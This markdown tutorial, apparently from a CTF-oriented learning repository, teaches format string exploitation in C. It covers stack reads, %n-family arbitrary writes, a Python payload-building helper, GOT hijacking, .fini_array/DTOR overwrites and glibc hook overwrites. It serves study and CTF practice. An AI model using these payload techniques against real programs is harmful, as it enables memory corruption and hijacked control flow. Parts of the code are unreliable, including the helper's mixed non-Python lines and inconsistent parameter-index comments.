# Format String Attack
First, take a look at the **printf** example.
```C
printf("%p",a);   //such %p is called "Format String"
//However, many people just use like the following >
printf("a");     //or printf(buf);  
//Vulnerability also live in family of printf,vsprintf,fprintf,vsnprintf,sprint,vfprintf,snprintf,vprintf.
```  
Now, you should know that is very **dangerous**. When the author forget to use the format string then hacker can **control** the format string to attack. OK, let's us learn how to attack.  

## Printf Layout
Sometimes printf will printf some weird value in the following situation.:scream:  
```C
#include <stdio.h>
#include <stdlib.h>
int main(int argc,char *argv[]){
  char *format = "%s";
  char *arg1 = "hello world!\n";
  printf(format,arg1);
  return EXIT_SUCCESS;
}  
// command "man 3 printf" then you can see more use of printf
// The above example is the right use  
printf("%p %p",a);
```  
We already know that one %p represents a variable. But in the example above, we can see that we use two %p with only one example, then we can see a weird value print out on result without crash. In fact, the weird value comes from the **stack**.:yum:  
The picture following can help you understand more......  
<img src="https://github.com/shinmao/WhyNot-StackOverflow/blob/master/Format-String-Attack/printf%20layout.png" width="626" height="276">   
Therefore, the value are all located in the consecutive position in the following. We can also print the value in specified location with the format string of %(num)$p.  

## Use of Format String
```C
%d: 4byte of integer, output decimal number
%u: 4byte of unsigned integer
%c: 1byte of character
%x: 4bytes of hex, output hexadecimal number
%s: 4byte string, read string from memory  
%p: ptr address  
%n: the number of string, write 4bytes untill the format string to memory  
%(num)c: at least num of string  
%h: 2byte, short int  
%hh: 1byte of char
%l: 4byte, long int
%ll: 8byte, long long int
```  
You may get tired with the rules above. Don't worry, I will show how to use it in soon.:+1:  
> When we start to attack, we also need to be careful that printf() will be eaten by the null bytes, this usually happen in 64-bits!  

## Read from arbitrary memory  
  
### First, tell you a little trick
When we neen to make the payload, the number before c is always a complex problem.  
Therefore, how about make up a function to calculate for us.    v Python  
```Python
def fmt(prev,val,index):
  result = ""
  if prev < val :
    result += "%"+str(val-prev)+"c"
  elif prev == val :
    result += ""
  else :  
    result = "%"+str(val-prev+256)+"c"  
  result += "%"+str(index)+"$hhn"
  return result  
#
#Try to play with this function??
#
$target is the value we want to write in  
for i in range(4):
  payload += fmt(prev,(target >> i*8)& 0xff,$index+i)  
  prev = (target >> i*8)& 0xff
```  
How to get the index of arguments?  
Assume that we want to get the index of 0x7fffffffdd58 on the stack in the following picture.(Be sure to set Break point at printf!!  
First, you can see that the argument is at the position of offset 5th, and the first one is return address so it should be on 4th.  
However, in the system of x64, there are 6 arguments stored in registers, and also the format string itself.  
Therefore, **%( 6 + 4 - 1)$p** can get what you want.:+1:  
Besides, we can use gdb-peda to get the index of argument such as the **fmtarg** in the following example.
<img src="https://github.com/shinmao/WhyNot-StackOverflow/blob/master/Format-String-Attack/fmtarg.png" width="474" height="280">  

## Help with your Buffer Overflow
Already know that we need to length of string to overwrite the ret address.  
Therefore, We can use %(num)d, %(num)u, or %(num)x to stretch the original one.  
**Be careful that "n" of %nd cannot be greater than 1000, or the program will crash. In this case, we can change to use %.nd**

## Write to arbitrary memory  
```C
"12345%3$n"   //write len(12345) to the fourth parameter  
"%123c%3$n"   //write 123 to the fourth parameter because "c" is the count
"%123c%3$hhn" //write one byte
"%30c%3$hhn%70c%4$hhn"   //Be careful, this mean we write 100 to the fifth parameter!!
```  
How do we solve the null-byte problem?  
```C
"%45068c%10$hn\xdd\xaa\x00\x00\x00\x00...."   //put the address at the end of payload then we can solve the problem  
```  
Besides, for convenience, we will padding format string to the 8 bytes.  
  
:fire: **GOT hijacking**  
What is GOT? List of pointers to dynamically linked symbols.  
```
readelf --relocs ./elf  
gdb-peda$ got
```  
![How about review GOT?](https://rafaelchen.wordpress.com/2017/09/25/pwn%E7%9A%84%E4%BF%AE%E7%85%89%E4%B9%8B%E8%B7%AF-lazy-binding/#more-1244)  
**Be sure that RELRO not be FULL**. When RELRO is open, pltsymbol will be removed.  
![Practice makes progress](https://github.com/shinmao/CTF-writeups/tree/master/NTU-CTF-2017/format-string)  
In the **craxme3.py**, it is the best practice of format string in GOT-Hijacking.  
  
:fire: **DTOR Overwrite**  
It is an old use of format string attack that hijack the flow after main function finished.  
Because most C programs will call destructors after main is executed.  
What is DTOR list? List of destructors to call.  
e.g.DEADBEEF: __DTOR_END__  
e.g.DEADBEEB: __DTOR_LIST__  
<img src="https://github.com/shinmao/WhyNot-StackOverflow/blob/master/Format-String-Attack/fini_array.png" width="637" height="122">
Nowadays, we can use command of **'objdump -h -j .fini_array ./elf'** to get the address of it.  
**Be sure that RELRO to be disabled**.  
  
:fire: **C Library hooks**  
A new technique to exploit **heap based** overflow in memory.  
The author of the paper Solar Designer suggest to overwrite a hook in GNU C Library and others.  
In common, the hooks are always used to debugging, and famous ones are  
:sparkles: _ _ malloc _ hook, _ _ realloc _ hook, _ _ free _ hook  
Originally, they are set to be NULL, if I overwrite them with some hijack pointer, malloc, realloc, and free will be hijacked when next time they are called. What's interesting, they will be executed **before** the real function executed because they are debug hooks!

## Advanced trick  
:fire: **Hijack ret address**  
It is also an interesting trick used in **double function call**.  
<img src="https://github.com/shinmao/WhyNot-StackOverflow/blob/master/Format-String-Attack/rbp%20chain.png" width="406" height="538">  
In fact, I still not complete the practice of it. After that I will update this tutorial in soon!  

## Reference  
![The reading I recommend so much](https://github.com/shinmao/WhyNot-StackOverflow/blob/master/Format-String-Attack/formatstring-umustread.pdf)
